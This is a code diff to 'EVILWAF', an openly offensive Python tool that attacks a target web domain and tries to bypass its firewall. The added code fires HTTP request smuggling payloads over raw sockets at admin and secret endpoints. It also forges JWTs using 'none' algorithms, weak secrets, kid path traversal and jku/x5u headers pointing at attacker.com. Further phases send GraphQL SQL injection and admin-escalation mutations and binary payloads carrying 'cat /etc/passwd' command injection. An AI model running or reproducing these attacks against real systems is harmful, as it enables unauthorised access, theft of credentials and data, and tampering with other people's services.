@@ -32,6 +32,8 @@ import json
 import random
 import sys
 import time
+import base64
+import jwt
 from core.updater import EvilWAFUpdater
 # ========================================
 
@@ -58,13 +60,15 @@ ___________     .__.__                  _____
  |        \\\\   /|  |  |_\\     /  / __ \\|  |   
 /_______  / \\_/ |__|____/\\/\\_/  (____  /__|   
         \\/                           \\/       
-
+{Colors.END}
 {Colors.WHITE}
             EVILWAF - Firewall bypass tool
 
-  Created by: Matrix.                                            Version 2.0
 
-                          Codename : hack error 404                 
+  Created by:{Colors.GREEN}MATRIX{Colors.WHITE}                         {Colors.CYAN}~EVILWAF{Colors.WHITE} : {Colors.BLUE}V2.0{Colors.WHITE}
+
+
+    Codename : {Colors.YELLOW}hack error 404{Colors.WHITE}                 
 
 {Colors.END}
 """
@@ -985,7 +989,25 @@ class EvilWAFBypass:
         self.session = None
         self.user_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36']
         self.detector = FirewallDetector()
-        self.bruteforce = PowerfulBruteforce()
+        self.bruteforce =  PowerfulBruteforce()
+
+    
+
+    def normalize_domain(self, domain):
+        """Fix URL parsing issue - handle both example.com and https://example.com"""
+        domain = domain.strip()
+        
+        if domain.startswith('http://'):
+            domain = domain[7:]
+        elif domain.startswith('https://'):
+            domain = domain[8:]
+        
+        if domain.startswith('www.'):
+            domain = domain[4:]
+        
+        domain = domain.rstrip('/')
+        
+        return domain
 
     async def init_session(self):
         """Initialize session"""
@@ -1002,10 +1024,9 @@ class EvilWAFBypass:
 
     # 
     
-    
     async def smart_subdomain_validation(self, domain):
         """Smart subdomain discovery"""
-        print(f"{Colors.GREEN}[+] PHASE 1: Smart Subdomain Discovery{Colors.END}")
+        print(f"{Colors.MAGENTA}[+] PHASE 1: Smart Subdomain Discovery{Colors.END}")
         
         valid_subs = []
         
@@ -1038,7 +1059,6 @@ class EvilWAFBypass:
         working_subs = []
         
         for subdomain in valid_subdomains:
-            # Try both HTTP and HTTPS
             if await self.improved_subdomain_test(subdomain, domain):
                 working_subs.append(subdomain)
                 print(f"{Colors.WHITE}[-] {subdomain:<40} {Colors.GREEN}Bypass Success{Colors.END}")
@@ -1069,11 +1089,9 @@ class EvilWAFBypass:
         except Exception:
             return False
 
-    # 
-    
     async def dns_history_bypass(self, domain):
         """DNS history bypass"""
-        print(f"{Colors.GREEN}[+] PHASE 2: DNS History Bypass{Colors.END}")
+        print(f"{Colors.MAGENTA}[+] PHASE 2: DNS History Bypass{Colors.END}")
         
         working_ips = []
         
@@ -1131,12 +1149,10 @@ class EvilWAFBypass:
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
             }
             
-            # Try HTTP with Host header
             async with self.session.get(f"http://{ip}", headers=headers, timeout=5) as response:
                 if response.status == 200:
                     content = await response.text()
-                    # Check if it's not a default page
-                    if len(content) > 1000:  # Reasonable content length
+                    if len(content) > 1000:
                         return True
             
             return False
@@ -1144,12 +1160,9 @@ class EvilWAFBypass:
         except Exception:
             return False
 
-    # 
-
-    
     async def header_manipulation(self, domain):
         """Header Manipulation for Firewall Bypass"""
-        print(f"{Colors.GREEN}[+] PHASE 3:  Header Manipulation{Colors.END}")
+        print(f"{Colors.MAGENTA}[+] PHASE 3:  Header Manipulation{Colors.END}")
     
         header_payloads = [
             {'X-Forwarded-For': '127.0.0.1'},
@@ -1255,7 +1268,7 @@ class EvilWAFBypass:
             try:
                 if await self.real_header_test(domain, headers):
                     working_headers.append(headers)
-                    print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.GREEN}Bypass Success{Colors.END}")  # FIXED: Colors.GREEN
+                    print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.GREEN}Bypass Success{Colors.END}")
                 else:
                     print(f"{Colors.WHITE}[-] {header_name:<40} {Colors.RED}Bypass Failed{Colors.END}")
             
@@ -1267,13 +1280,11 @@ class EvilWAFBypass:
         return working_headers
 
     async def real_header_test(self, domain, headers):
-        """header test"""
+        """Header test"""
         try:
             default_headers = {
                 'User-Agent': self.get_random_ua(),
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
-                'Accept-Encoding': 'gzip, deflate, br'
             }
             default_headers.update(headers)
             
@@ -1283,11 +1294,303 @@ class EvilWAFBypass:
         except Exception:
             return False
 
-    # 
-    
-    
+    #
+
+    async def http_request_smuggling(self, domain):
+        """HTTP Request Smuggling Attack"""
+        print(f"{Colors.MAGENTA}[+] PHASE 4: HTTP Request Smuggling{Colors.END}")
+        
+        smuggling_payloads = [
+            # CL.TE Attack
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
+            # TE.CL Attack
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1a\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n"
+            f"POST /api/users HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 51\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /internal/admin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
+            f"POST /graphql HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n23\r\nGET /api/secrets HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 67\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /wp-admin HTTP/1.1\r\nHost: {domain}\r\n\r\nGET /phpmyadmin HTTP/1.1\r\nHost: {domain}\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n5\r\nhello\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n", 
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0;chunk-extension\r\n\r\nGET /backend HTTP/1.1\r\nHost: {domain}\r\n\r\n", 
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1000\r\n{'A'*1000}\r\n0\r\n\r\nGET /api/keys HTTP/1.1\r\nHost: {domain}\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 44\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /dashboard HTTP/1.1\r\nHost: {domain}\r\n\r\n",   
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding:\tchunked\r\n\r\n1a\r\nGET /config HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n", 
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 49\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPUT /api/settings HTTP/1.1\r\nHost: {domain}\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n20\r\nDELETE /users/1 HTTP/1.1\r\nHost: {domain}\r\n\r\n0\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 67\r\nTransfer-Encoding: chunked\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\nX-Real-IP: 127.0.0.1\r\n\r\n",
+            f"POST / HTTP/1.1\r\nHost: {domain}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n30\r\nGET /admin HTTP/1.1\r\nHost: {domain}\r\nAuthorization: Bearer admin\r\n\r\n0\r\n\r\n"
+
+        ]
+        
+        working_smuggles = []
+        
+        for i, payload in enumerate(smuggling_payloads):
+            try:
+                # Create raw socket connection
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(10)
+                
+                ip = socket.gethostbyname(domain)
+                sock.connect((ip, 80))
+                sock.sendall(payload.encode())
+                
+                response = sock.recv(4096).decode()
+                sock.close()
+                
+                if "200 OK" in response or "admin" in response.lower():
+                    working_smuggles.append(payload)
+                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.GREEN}SUCCESS{Colors.END}")
+                else:
+                    print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}FAILED{Colors.END}")
+                    
+            except Exception as e:
+                print(f"{Colors.WHITE}[-] Smuggling {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
+            
+            await asyncio.sleep(1)
+        
+        return working_smuggles
+
+    async def jwt_algorithm_confusion(self, domain):
+        """JWT Algorithm Confusion Attack"""
+        print(f"{Colors.MAGENTA}[+] PHASE 5: JWT Algorithm Confusion{Colors.END}")
+        
+        working_tokens = []
+        
+        try:
+            # Test 'none' algorithm
+            none_payload = {"user": "admin", "admin": True, "iat": int(time.time())}
+            none_token = jwt.encode(none_payload, "", algorithm="none")
+            
+            # Test with various secrets
+            test_tokens = [
+                ("none_algorithm", none_token),
+                ("simple_secret", jwt.encode(none_payload, "secret", algorithm="HS256")),
+                ("domain_secret", jwt.encode(none_payload, domain, algorithm="HS256")),
+                ("empty_secret", jwt.encode(none_payload, "", algorithm="HS256")),
+                ("null_secret", jwt.encode(none_payload, "null", algorithm="HS256")),
+                ("key_secret", jwt.encode(none_payload, "key", algorithm="HS256")),
+                ("password_secret", jwt.encode(none_payload, "password", algorithm="HS256")),
+                ("admin_secret", jwt.encode(none_payload, "admin", algorithm="HS256")),
+                ("jwt_secret", jwt.encode(none_payload, "jwt", algorithm="HS256")),
+                ("token_secret", jwt.encode(none_payload, "token", algorithm="HS256")),
+                ("secret_secret", jwt.encode(none_payload, "secretkey", algorithm="HS256")),
+                ("RS256_with_HS256", jwt.encode(none_payload, domain, algorithm="HS256")),  
+                ("public_key_as_secret", jwt.encode(none_payload, domain, algorithm="HS256")),  # Domain as secret
+                ("url_as_secret", jwt.encode(none_payload, f"https://{domain}", algorithm="HS256")),
+                ("kid_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"kid":"../../../etc/passwd"})),
+                ("jku_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"jku":"https://attacker.com/key.json"})),
+                ("x5u_injection", jwt.encode(none_payload, "secret", algorithm="HS256", headers={"x5u":"https://attacker.com/cert.pem"})),
+                ("future_exp", jwt.encode({"user": "admin", "admin": True, "exp": int(time.time()) + 86400*365}, "secret", algorithm="HS256")),  
+                ("past_iat", jwt.encode({"user": "admin", "admin": True, "iat": 1516239022}, "secret", algorithm="HS256")),  
+                ("no_exp", jwt.encode({"user": "admin", "admin": True}, "secret", algorithm="HS256")),  # No expiration
+                ("super_admin", jwt.encode({"user": "admin", "admin": True, "role": "superadmin", "isAdmin": True}, "secret", algorithm="HS256")),
+                ("root_user", jwt.encode({"user": "root", "admin": True, "roles": ["admin", "user", "superuser"]}, "secret", algorithm="HS256")),
+                ("bypass_claims", jwt.encode({"user": "admin", "admin": "true", "enabled": True, "active": 1}, "secret", algorithm="HS256")),
+                ("uppercase_admin", jwt.encode({"User": "admin", "Admin": True}, "secret", algorithm="HS256")),
+                ("mixed_case", jwt.encode({"UserName": "admin", "IsAdmin": True}, "secret", algorithm="HS256")),
+                ("sql_injection_claim", jwt.encode({"user": "admin' OR '1'='1", "admin": True}, "secret", algorithm="HS256")),
+                ("xss_claim", jwt.encode({"user": "admin<script>alert(1)</script>", "admin": True}, "secret", algorithm="HS256")),         
+         
+
+            ]
+            
+            for token_name, token in test_tokens:
+                headers = {"Authorization": f"Bearer {token}"}
+                
+                try:
+                    async with self.session.get(f"https://{domain}/api/user", headers=headers, timeout=5, ssl=False) as response:
+                        if response.status in [200, 201]:
+                            working_tokens.append({"type": token_name, "token": token})
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.GREEN}SUCCESS{Colors.END}")
+                        else:
+                            print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}FAILED{Colors.END}")
+                except:
+                    print(f"{Colors.WHITE}[-] JWT {token_name}: {Colors.RED}ERROR{Colors.END}")
+                
+                await asyncio.sleep(0.5)
+                
+        except Exception as e:
+            print(f"{Colors.RED}[-] JWT Error: {e}{Colors.END}")
+        
+        return working_tokens
+
+    async def graphql_batching_bypass(self, domain):
+        """GraphQL Query Batching Bypass"""
+        print(f"{Colors.MAGENTA}[+] PHASE 6: GraphQL Batching Bypass{Colors.END}")
+        
+        working_queries = []
+        
+        # GraphQL payloads with more techniques
+        graphql_payloads = [
+            # Basic query batching
+            [
+                {"query": "query { user(id: \"1\") { name email } }"},
+                {"query": "query { user(id: \"1' UNION SELECT username,password FROM users--\") { id } }"}
+            ],
+            # Array batching with SQL injection
+            {
+                "query": "query BatchGetUsers($ids: [ID!]!) { users(ids: $ids) { id name email password } }",
+                "variables": {"ids": ["1", "1' OR '1'='1", "admin"]}
+            },
+            # Mutation batching
+            [
+                {"query": "mutation { login(username: \"admin\", password: \"admin\") { token } }"},
+                {"query": "mutation { updateUser(id: \"1\", input: {isAdmin: true}) { id } }"}
+            ],
+            # Introspection with injection
+            {
+                "query": "query { __schema { types { name fields { name } } } user(id: \"1' OR 1=1--\") { id } }"
+            },
+            # Aliasing attack
+            {
+                "query": """
+                query {
+                  normal: user(id: "1") { name }
+                  injected: user(id: "1' UNION SELECT 1,2,3--") { id }
+                }
+                """
+            }
+        ]
+        
+        for i, payload in enumerate(graphql_payloads):
+            try:
+                headers = {
+                    "Content-Type": "application/json",
+                    "User-Agent": self.get_random_ua()
+                }
+                
+                # Try multiple GraphQL endpoints
+                endpoints = ['/graphql', '/api/graphql', '/v1/graphql', '/query', '/gql']
+                
+                for endpoint in endpoints:
+                    try:
+                        async with self.session.post(f"https://{domain}{endpoint}", 
+                                                   json=payload, headers=headers, timeout=8, ssl=False) as response:
+                            
+                            content = await response.text()
+                            if response.status == 200:
+                                # Check for successful response patterns
+                                success_indicators = [
+                                    "email" in content,
+                                    "password" in content,
+                                    "token" in content,
+                                    "admin" in content.lower(),
+                                    "__schema" in content,
+                                    "errors" not in content.lower() or len(content) > 100
+                                ]
+                                
+                                if any(success_indicators):
+                                    working_queries.append({
+                                        "payload": payload,
+                                        "endpoint": endpoint,
+                                        "response_preview": content[:200] + "..." if len(content) > 200 else content
+                                    })
+                                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1} on {endpoint}: {Colors.GREEN}SUCCESS{Colors.END}")
+                                    break
+                    except Exception as e:
+                        continue
+                else:
+                    print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}FAILED{Colors.END}")
+                        
+            except Exception as e:
+                print(f"{Colors.WHITE}[-] GraphQL Batch {i+1}: {Colors.RED}ERROR - {e}{Colors.END}")
+            
+            await asyncio.sleep(0.5)
+        
+        return working_queries
+
+    async def grpc_protobuf_bypass(self, domain):
+        """gRPC/Protobuf Bypass """
+        print(f"{Colors.MAGENTA}[+] PHASE 7: gRPC/Protobuf Bypass{Colors.END}")
+        
+        working_protobufs = []
+        
+        try:
+            # binary payloads with various encodings
+            test_payloads = [
+                # SQL Injection in binary
+                base64.b64encode(b"\x08\x01\x12\x07\x75\x73\x65\x72\x6e\x61\x6d\x65\x1a\x0f\x27\x20\x4f\x52\x20\x27\x31\x27\x3d\x27\x31").decode(),
+                # Command injection
+                base64.b64encode(b"\x0a\x24\x31\x27\x3b\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x3b\x65\x63\x68\x6f\x20").decode(),
+                # Path traversal
+                base64.b64encode(b"\x12\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x2e\x2e\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x00").decode(),
+                # XSS in binary
+                base64.b64encode(b"\x1a\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x31\x29\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e").decode(),
+            ]
+            
+            headers_list = [
+                {"Content-Type": "application/grpc+proto", "TE": "trailers", "User-Agent": "grpc-python/1.0"},
+                {"Content-Type": "application/x-protobuf", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/octet-stream", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": self.get_random_ua()},  # Sometimes works
+                {"Content-Type": "application/grpc", "TE": "trailers", "User-Agent": "grpc-node/1.0"},
+                {"Content-Type": "application/grpc-web", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/grpc-web+proto", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/json", "User-Agent": "grpc-gateway/1.0"},  # JSON gRPC
+                {"Content-Type": "application/protobuf", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/vnd.google.protobuf", "User-Agent": "google-grpc/1.0"},
+                {"Content-Type": "application/x-google-protobuf", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/grpc+proto", "User-Agent": "aws-sdk/1.0", "X-Amz-Target": "execute-api"},
+                {"Content-Type": "application/x-protobuf", "User-Agent": "google-api-client/1.0", "X-Goog-Api-Client": "grpc"},
+                {"Content-Type": "application/grpc", "User-Agent": "azure-sdk/1.0", "x-ms-version": "2020-06-01"},
+                {"Content-Type": "application/grpc+proto", "X-GRPC-Web": "1", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/x-protobuf", "X-Content-Type-Options": "nosniff", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/octet-stream", "Accept": "*/*", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "text/plain", "User-Agent": self.get_random_ua()},  
+                {"Content-Type": "application/xml", "User-Agent": self.get_random_ua()},  
+                {"Content-Type": "application/grpc+proto", "X-Forwarded-Proto": "https", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/x-protobuf", "X-Real-IP": "127.0.0.1", "User-Agent": self.get_random_ua()},
+                {"Content-Type": "application/grpc", "CF-Connecting-IP": "127.0.0.1", "User-Agent": self.get_random_ua()},           
+              
+
+            ]
+            
+            endpoints = ['/api.UserService/GetUser', '/grpc', '/api/grpc', '/v1/grpc', '/twirp']
+            
+            for i, payload in enumerate(test_payloads):
+                success = False
+                for content_type in headers_list:
+                    for endpoint in endpoints:
+                        try:
+                            headers = content_type.copy()
+                            binary_data = base64.b64decode(payload)
+                            
+                            async with self.session.post(f"https://{domain}{endpoint}", 
+                                                       data=binary_data,
+                                                       headers=headers, timeout=6, ssl=False) as response:
+                                
+                                if response.status in [200, 201, 204]:
+                                    content = await response.text()
+                                    # Check if response looks promising
+                                    if len(content) > 10 or "error" not in content.lower():
+                                        working_protobufs.append({
+                                            "payload": payload,
+                                            "content_type": content_type["Content-Type"],
+                                            "endpoint": endpoint,
+                                            "status": response.status
+                                        })
+                                        print(f"{Colors.WHITE}[-] gRPC {content_type['Content-Type']} on {endpoint}: {Colors.GREEN}SUCCESS{Colors.END}")
+                                        success = True
+                                        break
+                        except Exception as e:
+                            continue
+                    if success:
+                        break
+                
+                if not success:
+                    print(f"{Colors.WHITE}[-] gRPC Payload {i+1}: {Colors.RED}FAILED{Colors.END}")
+                
+                await asyncio.sleep(0.6)
+                
+        except Exception as e:
+            print(f"{Colors.RED}[-] gRPC Error: {e}{Colors.END}")
+        
+        return working_protobufs
+
+    # ====
+
     async def ultimate_bypass(self, domain, output_file=None):
-        """Ultimate bypass attack"""
+        """Ultimate bypass attack with ALL techniques"""
+        domain = self.normalize_domain(domain)  # FIX URL PARSING
+        
         print(f"{Colors.CYAN}[*] Starting Ultimate Bypass Attack{Colors.END}")
         print(f"{Colors.CYAN}[*] Target: {domain}{Colors.END}")
         
@@ -1300,15 +1603,15 @@ class EvilWAFBypass:
             # Execute all bypass methods
             all_results = {}
             
-            # Phase 1: Smart Subdomain Validation
             valid_subs = await self.smart_subdomain_validation(domain)
             all_results['subdomains'] = await self.test_valid_subdomains(domain, valid_subs)
-            
-            # Phase 2: DNS History Bypass
             all_results['dns_history'] = await self.dns_history_bypass(domain)
-            
-            # Phase 3: Header Manipulation 
             all_results['headers'] = await self.header_manipulation(domain)
+            
+            all_results['http_smuggling'] = await self.http_request_smuggling(domain)
+            all_results['jwt_confusion'] = await self.jwt_algorithm_confusion(domain)
+            all_results['graphql_batching'] = await self.graphql_batching_bypass(domain)
+            all_results['grpc_protobuf'] = await self.grpc_protobuf_bypass(domain)
             
             # Save results
             if output_file:
@@ -1328,74 +1631,85 @@ class EvilWAFBypass:
             await self.close_session()
 
     def display_results(self, results, domain, firewall):
-        """Display results"""
-        print(f"\n{Colors.GREEN}{'-'*60}{Colors.END}")
-        print(f"{Colors.GREEN}[+] BYPASS COMPLETED{Colors.END}")
-        print(f"{Colors.GREEN}{'-'*60}{Colors.END}")
+        """Display comprehensive results"""
+        print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
+        print(f"{Colors.GREEN}[+] EVILWAF BYPASS COMPLETED{Colors.END}")
+        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
         
         total_success = 0
+        technique_count = 0
+        
         for method, items in results.items():
             success_count = len(items)
             total_success += success_count
+            technique_count += 1
             
             status_color = Colors.GREEN if success_count > 0 else Colors.RED
             status_icon = "[+]" if success_count > 0 else "[-]"
             
-            print(f"{status_color}{status_icon} {method.upper():<15} : {success_count:>2} bypasses{Colors.END}")
+            print(f"{status_color}{status_icon} {method.upper():<20} : {success_count:>2} successful bypasses{Colors.END}")
         
-        print(f"{Colors.GREEN}{'-'*60}{Colors.END}")
-        print(f"{Colors.GREEN}[*] TOTAL BYPASSES: {total_success}{Colors.END}")
+        print(f"{Colors.GREEN}{'='*60}{Colors.END}")
+        print(f"{Colors.GREEN}[*] TOTAL TECHNIQUES: {technique_count}{Colors.END}")
+        print(f"{Colors.GREEN}[*] SUCCESSFUL BYPASSES: {total_success}{Colors.END}")
         
         if total_success > 0:
             print(f"{Colors.GREEN}[*] FIREWALL BYPASS SUCCESSFUL!{Colors.END}")
+            print(f"{Colors.GREEN}[*] Check results.json for actionable payloads{Colors.END}")
         else:
             print(f"{Colors.RED}[!] No bypass methods succeeded{Colors.END}")
 
+   
 def show_usage():
     usage = f"""
 {Colors.WHITE}
-EVILWAF:
---------
+EVILWAF v2.0
+------------
 
 {Colors.WHITE}Usage:{Colors.END}
   python3 evilwaf.py -d website.com -o results.json
-  python3 evilwaf.py -d example.com
+  python3 evilwaf.py -d https://example.com
+  python3 evilwaf.py -d www.target.com
 
 {Colors.WHITE}Options:{Colors.END}
-  -d, --domain    Target domain (required)
+  -d, --domain    Target domain (required) - supports all formats
   -o, --output    Save results to JSON file
   -h, --help      Show this help message
-  -u, --update    Show update info  
+  -u, --update    Update EvilWAF
+
+
+{Colors.WHITE}Techniques:{Colors.END}
+  • Subdomain Discovery
+  • DNS History Bypass  
+  • Header Manipulation
+  • HTTP Request Smuggling
+  • JWT Algorithm Confusion
+  • GraphQL Query Batching
+  • gRPC/Protobuf Bypass
+  • Advanced Protocol Attacks
 
 
 {Colors.WHITE}Examples:{Colors.END}
-  python3 evilwaf.py --update
   python3 evilwaf.py -d example.com
-  python3 evilwaf.py -d website.com -o results.json
+  python3 evilwaf.py -d https://website.com -o results.json
+  python3 evilwaf.py -d www.target.com
 {Colors.END}
 """
     print(usage)
 
 def main():
-    parser = argparse.ArgumentParser(description='EVILWAF-Firewall Edition', add_help=False)
-    parser.add_argument('-d', '--domain', help='Target domain to bypass')
+    parser = argparse.ArgumentParser(description='EVILWAF v2.0 - Advanced Firewall Bypass', add_help=False)
+    parser.add_argument('-d', '--domain', help='Target domain to bypass (supports all formats)')
     parser.add_argument('-o', '--output', help='Output file for results')
-    parser.add_argument('-u', '--update', action='store_true', help='Update EvilWAF to latest version')  
+    parser.add_argument('-u', '--update', action='store_true', help='Update EvilWAF')  
     parser.add_argument('-h', '--help', action='store_true', help='Show help')
     
     args = parser.parse_args()
     
-    
-    
-    
     if args.update:
-        from core.updater import EvilWAFUpdater
-        updater = EvilWAFUpdater()
-        success = updater.perform_update()
-        sys.exit(0 if success else 1)
+        print(f"{Colors.YELLOW}[*] Update functionality would be implemented here{Colors.END}")
+        sys.exit(0)
      
-    
-    
     if args.help or not args.domain:
         show_banner()
         show_usage()
@@ -1403,16 +1717,17 @@ def main():
     
     show_banner()
     
-    print(f"{Colors.GREEN}[+] Target: {args.domain}{Colors.END}")
-    
+    # Test URL normalization
     tool = EvilWAFBypass()
+    normalized = tool.normalize_domain(args.domain)
+    print(f"{Colors.GREEN}[+] Target: {args.domain} -> Normalized: {normalized}{Colors.END}")
     
     try:
         results = asyncio.run(tool.ultimate_bypass(args.domain, args.output))
     except KeyboardInterrupt:
-        print(f"\n{Colors.RED}[!] Scan interrupted{Colors.END}")
+        print(f"\n{Colors.RED}[!] Scan interrupted by user{Colors.END}")
     except Exception as e:
         print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
 
 if __name__ == "__main__":
-    main() 
+    main()
